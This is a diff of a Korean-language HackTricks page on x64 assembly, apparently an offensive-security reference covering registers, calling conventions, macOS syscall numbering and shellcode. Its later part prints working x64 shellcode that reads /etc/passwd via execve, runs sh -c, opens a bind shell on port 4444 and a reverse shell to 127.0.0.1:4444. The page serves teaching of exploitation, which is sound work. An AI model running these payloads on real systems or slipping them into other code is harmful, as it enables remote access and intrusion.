@@ -1,86 +1,88 @@
-# x64 소개
+# Introduction to x64
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅이 되는 AWS 해킹을 배우세요** <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하길 원한다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우**하세요.
-* **HackTricks** 및 **HackTricks Cloud** github 저장소로 **PR을 제출**하여 귀하의 해킹 기술을 공유하세요.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## **x64 소개**
+## **Introduction to x64**
 
-x64 또는 x86-64은 주로 데스크탑 및 서버 컴퓨팅에서 사용되는 64비트 프로세서 아키텍처입니다. 인텔이 생산한 x86 아키텍처에서 유래하였으며 AMD가 AMD64라는 이름으로 채택한 후 현재 개인 컴퓨터 및 서버에서 주요 아키텍처로 사용되고 있습니다.
+x64, 또는 x86-64로 알려진, 64비트 프로세서 아키텍처로 주로 데스크탑 및 서버 컴퓨팅에 사용됩니다. Intel에서 생산한 x86 아키텍처에서 유래되었으며, 이후 AMD가 AMD64라는 이름으로 채택하였습니다. 현재 개인용 컴퓨터와 서버에서 널리 사용되는 아키텍처입니다.
 
-### **레지스터**
+### **Registers**
 
-x64는 x86 아키텍처를 확장하여 `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, 그리고 `r8`부터 `r15`까지 레이블이 붙은 **16개의 범용 레지스터**를 제공합니다. 각 레지스터는 **64비트**(8바이트) 값을 저장할 수 있습니다. 이러한 레지스터는 호환성 및 특정 작업을 위해 32비트, 16비트 및 8비트 하위 레지스터도 가지고 있습니다.
+x64는 x86 아키텍처를 확장하여 **16개의 범용 레지스터**를 제공합니다. 이들은 `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, 및 `r8`에서 `r15`까지 레이블이 붙어 있습니다. 각 레지스터는 **64비트**(8바이트) 값을 저장할 수 있습니다. 이 레지스터들은 호환성과 특정 작업을 위해 32비트, 16비트, 8비트 하위 레지스터도 가지고 있습니다.
 
-1. **`rax`** - 함수로부터의 **반환 값**으로 전통적으로 사용됩니다.
-2. **`rbx`** - 메모리 작업의 **베이스 레지스터**로 자주 사용됩니다.
+1. **`rax`** - 전통적으로 **함수의 반환 값**에 사용됩니다.
+2. **`rbx`** - 메모리 작업을 위한 **기본 레지스터**로 자주 사용됩니다.
 3. **`rcx`** - **루프 카운터**로 일반적으로 사용됩니다.
-4. **`rdx`** - 확장된 산술 연산을 포함한 여러 역할에 사용됩니다.
-5. **`rbp`** - 스택 프레임의 **베이스 포인터**입니다.
+4. **`rdx`** - 확장된 산술 연산을 포함한 다양한 역할에 사용됩니다.
+5. **`rbp`** - 스택 프레임의 **기본 포인터**입니다.
 6. **`rsp`** - 스택의 맨 위를 추적하는 **스택 포인터**입니다.
-7. **`rsi`** 및 **`rdi`** - 문자열/메모리 작업에서 **소스** 및 **대상** 인덱스로 사용됩니다.
-8. **`r8`**부터 **`r15`** - x64에서 도입된 추가 범용 레지스터입니다.
+7. **`rsi`** 및 **`rdi`** - 문자열/메모리 작업에서 **소스** 및 **대상** 인덱스에 사용됩니다.
+8. **`r8`**에서 **`r15`** - x64에서 도입된 추가 범용 레지스터입니다.
 
-### **호출 규약**
+### **Calling Convention**
 
 x64 호출 규약은 운영 체제에 따라 다릅니다. 예를 들어:
 
-* **Windows**: 처음 **네 개의 매개변수**는 레지스터 **`rcx`**, **`rdx`**, **`r8`**, **`r9`**에 전달됩니다. 추가 매개변수는 스택에 푸시됩니다. 반환 값은 **`rax`**에 있습니다.
-* **System V (UNIX와 유사한 시스템에서 일반적으로 사용됨)**: 처음 **여섯 개의 정수 또는 포인터 매개변수**는 레지스터 **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, **`r9`**에 전달됩니다. 반환 값 또한 **`rax`**에 있습니다.
+* **Windows**: 첫 번째 **네 개의 매개변수**는 레지스터 **`rcx`**, **`rdx`**, **`r8`**, 및 **`r9`**에 전달됩니다. 추가 매개변수는 스택에 푸시됩니다. 반환 값은 **`rax`**에 있습니다.
+* **System V (UNIX 유사 시스템에서 일반적으로 사용됨)**: 첫 번째 **여섯 개의 정수 또는 포인터 매개변수**는 레지스터 **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, 및 **`r9`**에 전달됩니다. 반환 값도 **`rax`**에 있습니다.
 
-함수에 여섯 개 이상의 입력이 있는 경우 **나머지는 스택에 전달**됩니다. **RSP**, 스택 포인터는 **16바이트 정렬**이 되어야 하며, 이는 호출이 발생하기 전에 가리키는 주소가 16으로 나누어 떨어져야 함을 의미합니다. 일반적으로 우리는 함수 호출 전에 쉘코드에서 RSP가 적절하게 정렬되어 있는지 확인해야 합니다. 그러나 실제로는 이 요구 사항을 충족하지 않아도 시스템 호출이 많은 시간 동작합니다.
+함수가 여섯 개 이상의 입력을 가지면, **나머지는 스택에 전달됩니다**. **RSP**, 스택 포인터는 **16바이트 정렬**되어야 하며, 이는 호출이 발생하기 전에 가리키는 주소가 16으로 나누어 떨어져야 함을 의미합니다. 이는 일반적으로 함수 호출 전에 RSP가 적절히 정렬되어야 함을 의미합니다. 그러나 실제로는 이 요구 사항이 충족되지 않더라도 시스템 호출이 여러 번 작동합니다.
 
-### Swift에서의 호출 규약
+### Calling Convention in Swift
 
-Swift는 자체 **호출 규약**을 가지고 있으며 [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)에서 찾을 수 있습니다.
+Swift는 [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)에서 찾을 수 있는 자체 **호출 규약**을 가지고 있습니다.
 
-### **일반적인 명령어**
+### **Common Instructions**
 
-x64 명령어에는 이전 x86 명령어와의 호환성을 유지하고 새로운 명령어를 도입하는 풍부한 세트가 있습니다.
+x64 명령어는 풍부한 세트를 가지고 있으며, 이전 x86 명령어와의 호환성을 유지하고 새로운 명령어를 도입합니다.
 
-* **`mov`**: 한 **레지스터** 또는 **메모리 위치**에서 다른 위치로 **값을 이동**합니다.
+* **`mov`**: 한 **레지스터** 또는 **메모리 위치**에서 다른 위치로 값을 **이동**합니다.
 * 예: `mov rax, rbx` — `rbx`의 값을 `rax`로 이동합니다.
-* **`push`** 및 **`pop`**: **스택**에 값을 **푸시**하거나 **팝**합니다.
+* **`push`** 및 **`pop`**: **스택**에 값을 푸시하거나 팝합니다.
 * 예: `push rax` — `rax`의 값을 스택에 푸시합니다.
 * 예: `pop rax` — 스택의 맨 위 값을 `rax`로 팝합니다.
 * **`add`** 및 **`sub`**: **덧셈** 및 **뺄셈** 연산입니다.
 * 예: `add rax, rcx` — `rax`와 `rcx`의 값을 더하여 결과를 `rax`에 저장합니다.
-* **`mul`** 및 **`div`**: **곱셈** 및 **나눗셈** 연산입니다. 참고: 피연산자 사용에 대한 특정 동작이 있습니다.
-* **`call`** 및 **`ret`**: 함수를 **호출**하고 **함수에서 반환**하는 데 사용됩니다.
-* **`int`**: 소프트웨어 **인터럽트**를 트리거하는 데 사용됩니다. 예: 32비트 x86 Linux에서 시스템 호출에 `int 0x80`이 사용되었습니다.
+* **`mul`** 및 **`div`**: **곱셈** 및 **나눗셈** 연산입니다. 주의: 이들은 피연산자 사용에 대한 특정 동작을 가지고 있습니다.
+* **`call`** 및 **`ret`**: 함수를 **호출**하고 **반환**하는 데 사용됩니다.
+* **`int`**: 소프트웨어 **인터럽트**를 트리거하는 데 사용됩니다. 예: `int 0x80`는 32비트 x86 리눅스에서 시스템 호출에 사용되었습니다.
 * **`cmp`**: 두 값을 **비교**하고 결과에 따라 CPU의 플래그를 설정합니다.
 * 예: `cmp rax, rdx` — `rax`를 `rdx`와 비교합니다.
 * **`je`, `jne`, `jl`, `jge`, ...**: 이전 `cmp` 또는 테스트의 결과에 따라 제어 흐름을 변경하는 **조건부 점프** 명령어입니다.
 * 예: `cmp rax, rdx` 명령어 후, `je label` — `rax`가 `rdx`와 같으면 `label`로 점프합니다.
-* **`syscall`**: 일부 x64 시스템(현대 Unix와 같은)에서 **시스템 호출**에 사용됩니다.
+* **`syscall`**: 일부 x64 시스템(예: 현대 Unix)에서 **시스템 호출**에 사용됩니다.
 * **`sysenter`**: 일부 플랫폼에서 최적화된 **시스템 호출** 명령어입니다.
 
-### **함수 프롤로그**
+### **Function Prologue**
 
-1. **이전 베이스 포인터를 푸시**: `push rbp` (호출자의 베이스 포인터 저장)
-2. **현재 스택 포인터를 베이스 포인터로 이동**: `mov rbp, rsp` (현재 함수의 새로운 베이스 포인터 설정)
-3. **로컬 변수를 위한 스택에 공간 할당**: `sub rsp, <size>` (<size>는 필요한 바이트 수입니다)
+1. **이전 기본 포인터 푸시**: `push rbp` (호출자의 기본 포인터를 저장)
+2. **현재 스택 포인터를 기본 포인터로 이동**: `mov rbp, rsp` (현재 함수에 대한 새로운 기본 포인터 설정)
+3. **로컬 변수를 위한 스택 공간 할당**: `sub rsp, <size>` (여기서 `<size>`는 필요한 바이트 수)
 
-### **함수 에필로그**
+### **Function Epilogue**
 
-1. **현재 베이스 포인터를 스택 포인터로 이동**: `mov rsp, rbp` (로컬 변수 해제)
-2. **이전 베이스 포인터를 스택에서 팝**: `pop rbp` (호출자의 베이스 포인터 복원)
+1. **현재 기본 포인터를 스택 포인터로 이동**: `mov rsp, rbp` (로컬 변수 해제)
+2. **스택에서 이전 기본 포인터 팝**: `pop rbp` (호출자의 기본 포인터 복원)
 3. **반환**: `ret` (호출자에게 제어 반환)
+
 ## macOS
 
-### 시스템 호출
+### syscalls
 
-다양한 종류의 시스템 호출이 있습니다. [**여기에서 찾을 수 있습니다**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+다양한 클래스의 syscalls가 있으며, [**여기에서 찾을 수 있습니다**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -89,7 +91,7 @@ x64 명령어에는 이전 x86 명령어와의 호환성을 유지하고 새로�
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-그럼, 각 시스템 호출 번호를 [**이 URL에서**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)** 찾을 수 있습니다:**
+그럼 각 syscall 번호를 [**이 URL에서**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:** 찾을 수 있습니다.
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -106,13 +108,13 @@ x64 명령어에는 이전 x86 명령어와의 호환성을 유지하고 새로�
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-그래서 **Unix/BSD 클래스**에서 `open` 시스템 호출(**5**)을 하려면 `0x2000000`을 추가해야 합니다.
+그래서 **Unix/BSD 클래스**에서 `open` 시스템 호출 (**5**)을 호출하려면 다음을 추가해야 합니다: `0x2000000`
 
-따라서 `open`을 호출하기 위한 시스템 호출 번호는 `0x2000005`가 됩니다.
+따라서 open을 호출하는 시스템 호출 번호는 `0x2000005`가 됩니다.
 
-### 쉘코드
+### Shellcodes
 
-컴파일하려면:
+컴파일하려면: 
 
 {% code overflow="wrap" %}
 ```bash
@@ -185,12 +187,12 @@ return 0;
 ```
 </details>
 
-#### 쉘
+#### Shell
 
-[**여기**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)에서 가져온 내용을 설명합니다.
+[**여기**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)에서 가져온 내용입니다.
 
 {% tabs %}
-{% tab title="adr를 사용한 경우" %}
+{% tab title="adr 사용" %}
 ```armasm
 bits 64
 global _main
@@ -228,7 +230,7 @@ syscall
 
 #### cat으로 읽기
 
-목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`을 실행하는 것이므로 두 번째 인자 (x1)는 매개변수 배열이어야 합니다 (메모리에서는 주소 스택을 의미합니다).
+목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이며, 두 번째 인수(x1)는 매개변수의 배열입니다(메모리에서 이는 주소의 스택을 의미합니다).
 ```armasm
 bits 64
 section .text
@@ -259,7 +261,7 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### sh를 사용하여 명령 호출
+#### sh로 명령어 호출하기
 ```armasm
 bits 64
 section .text
@@ -297,9 +299,9 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-#### Bind 쉘
+#### Bind shell
 
-[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)에서 **포트 4444**의 Bind 쉘
+**포트 4444**에서 [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)의 Bind shell
 ```armasm
 section .text
 global _main
@@ -374,9 +376,9 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-#### 리버스 쉘
+#### Reverse Shell
 
-[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)에서 제공된 리버스 쉘. **127.0.0.1:4444**로의 리버스 쉘.
+[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)에서 리버스 셸. **127.0.0.1:4444**로 리버스 셸
 ```armasm
 section .text
 global _main
@@ -438,16 +440,17 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 제로부터 전문가까지 배우세요</strong></summary>
+<summary>Support HackTricks</summary>
 
-다른 방법으로 HackTricks를 지원하는 방법:
-
-* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하길 원한다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)에서 **팔로우**하세요.
-* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
